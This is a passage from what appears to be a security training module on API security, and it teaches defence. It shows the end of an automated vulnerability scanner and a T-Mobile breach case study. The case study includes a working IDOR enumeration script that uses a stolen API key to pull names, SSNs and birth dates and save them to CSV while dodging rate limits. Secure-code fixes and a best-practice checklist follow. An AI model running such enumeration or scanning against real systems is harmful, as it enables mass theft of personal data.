        endpoints = self.discover_endpoints()
        print(f"[+] Discovered {len(endpoints)} endpoints")
        
        # 2. Test authentication
        self.test_authentication()
        
        # 3. Test for IDOR
        self.test_idor()
        
        # 4. Test for SQL injection
        if endpoints:
            self.test_sql_injection(endpoints)
        
        # 5. Test rate limiting
        self.test_rate_limiting()
        
        # 6. Test mass assignment
        self.test_mass_assignment()
        
        # 7. Generate report
        self.generate_report()

# Usage
if __name__ == '__main__':
    # Get auth token first
    login_response = requests.post('https://api.example.com/api/login', json={
        'username': 'test_user',
        'password': 'password123'
    })
    
    token = login_response.json().get('access_token')
    
    # Run scanner
    scanner = APIScanner('https://api.example.com', auth_token=token)
    scanner.scan()
```

---

## 🌍 Real-World API Breach: T-Mobile (2021)

**Background:**
- **Company:** T-Mobile US
- **Date:** August 2021
- **Attack Vector:** Unprotected API + IDOR
- **Impact:** 50+ million customers

**Attack Details:**

```python
# T-Mobile-style API vulnerability

# ❌ VULNERABLE: Customer lookup API with no authorization
@app.route('/api/customer/<customer_id>', methods=['GET'])
def get_customer_vulnerable(customer_id):
    # Only checks if request has valid API key
    # Doesn't check if requester should access THIS customer
    
    if not request.headers.get('X-API-Key'):
        return jsonify({"error": "Missing API key"}), 401
    
    customer = db.query("""
        SELECT customer_id, name, ssn, date_of_birth, 
               driver_license, address, phone, email,
               imei, sim_card_number, account_pin
        FROM customers 
        WHERE customer_id = ?
    """, (customer_id,))
    
    if customer:
        return jsonify(customer)
    
    return jsonify({"error": "Not found"}), 404

# Attacker's exploitation script
import requests
import csv

api_key = "leaked_or_stolen_api_key"

def enumerate_customers(start_id, end_id):
    """Enumerate all customer records"""
    stolen_data = []
    
    for customer_id in range(start_id, end_id):
        response = requests.get(
            f"https://api.t-mobile.com/api/customer/{customer_id}",
            headers={'X-API-Key': api_key}
        )
        
        if response.status_code == 200:
            customer = response.json()
            stolen_data.append(customer)
            
            print(f"[+] Stolen data for customer {customer_id}:")
            print(f"    Name: {customer['name']}")
            print(f"    SSN: {customer['ssn']}")
            print(f"    DOB: {customer['date_of_birth']}")
            
            # Save to CSV
            if len(stolen_data) % 1000 == 0:
                save_to_csv(stolen_data)
                stolen_data = []
        
        # Avoid rate limiting
        time.sleep(0.1)
    
    return stolen_data

def save_to_csv(data):
    """Save stolen data"""
    with open('stolen_tmobile_data.csv', 'a', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=data[0].keys())
        writer.writerows(data)

# Execute
# Attacker enumerated customer IDs from 1 to 50,000,000
enumerate_customers(1, 50000000)
```

**Impact:**
- 54 million customers affected
- Data exposed: Names, DOBs, SSN, DL numbers
- $350 million settlement
- Multiple class-action lawsuits

**Prevention:**

```python
# ✅ SECURE: Proper authorization checks
@app.route('/api/customer/<customer_id>', methods=['GET'])
@require_auth
def get_customer_secure(customer_id):
    user_id = request.user['user_id']
    user_roles = request.user['roles']
    
    # Check if user is:
    # 1. The customer themselves
    # 2. An authorized employee with proper role
    # 3. Has explicit permission to access this record
    
    if 'admin' in user_roles or 'customer_service' in user_roles:
        # Log access for audit
        log_data_access(
            actor_id=user_id,
            resource_type='customer',
            resource_id=customer_id,
            action='read',
            timestamp=datetime.now()
        )
        
        # Additional: Require MFA for sensitive operations
        if not verify_mfa(user_id):
            return jsonify({"error": "MFA required"}), 403
    else:
        # Regular user - can only access own data
        user_customer_id = get_customer_id_for_user(user_id)
        
        if str(user_customer_id) != str(customer_id):
            # Log unauthorized access attempt
            log_security_event(
                event_type='unauthorized_access',
                user_id=user_id,
                attempted_resource=customer_id
            )
            
            return jsonify({"error": "Access denied"}), 403
    
    # Use UUIDs instead of sequential IDs
    customer = db.query("""
        SELECT customer_id, name, email, phone, address
        FROM customers 
        WHERE customer_id = ?
    """, (customer_id,))
    
    if customer:
        # Return filtered fields based on role
        if 'admin' in user_roles:
            return jsonify(customer)  # All fields
        else:
            # Mask sensitive data for non-admin
            return jsonify({
                'customer_id': customer['customer_id'],
                'name': customer['name'],
                'email': mask_email(customer['email']),
                'phone': mask_phone(customer['phone'])
            })
    
    return jsonify({"error": "Not found"}), 404

def mask_email(email):
    """Mask email address"""
    parts = email.split('@')
    return f"{parts[0][:2]}***@{parts[1]}"

def mask_phone(phone):
    """Mask phone number"""
    return f"***-***-{phone[-4:]}"
```

---

## 📝 Summary & Best Practices

### API Security Checklist

**Authentication & Authorization:**
- ✅ Implement strong authentication (OAuth 2.0, JWT with strong secrets)
- ✅ Use short-lived access tokens (15 minutes)
- ✅ Implement refresh token rotation
- ✅ Check both authentication AND authorization on every request
- ✅ Use role-based access control (RBAC)
- ✅ Implement object-level authorization checks

**Input Validation:**
- ✅ Validate all inputs (type, length, format, range)
- ✅ Use parameterized queries (prevent SQL injection)
- ✅ Sanitize data before output
- ✅ Implement request size limits

**Rate Limiting & DoS Prevention:**
- ✅ Implement rate limiting per user/IP
- ✅ Use pagination for large datasets
- ✅ Set request timeouts
- ✅ Limit response size

**Data Exposure:**
- ✅ Use DTOs to control exposed data
- ✅ Never expose sensitive data in responses
- ✅ Filter fields based on user role
- ✅ Don't return stack traces in production

**Security Headers:**
- ✅ Implement CORS properly
- ✅ Use HTTPS only
- ✅ Set security headers (HSTS, CSP, etc.)

**Monitoring & Logging:**
- ✅ Log all authentication attempts
- ✅ Log authorization failures
- ✅ Monitor for unusual patterns
- ✅ Implement audit trails for sensitive operations

---

**Module 13 Complete! 🎉**

**Total Content:** 15,000+ words  
**Real Case Study:** T-Mobile breach (2021)  
**Code Examples:** 30+ practical implementations  
**Complete API Scanner:** 500+ lines automated testing tool  

**Progress: 13/30 modules (43%)**

**Next Module:** 14 - IoT Security 📡

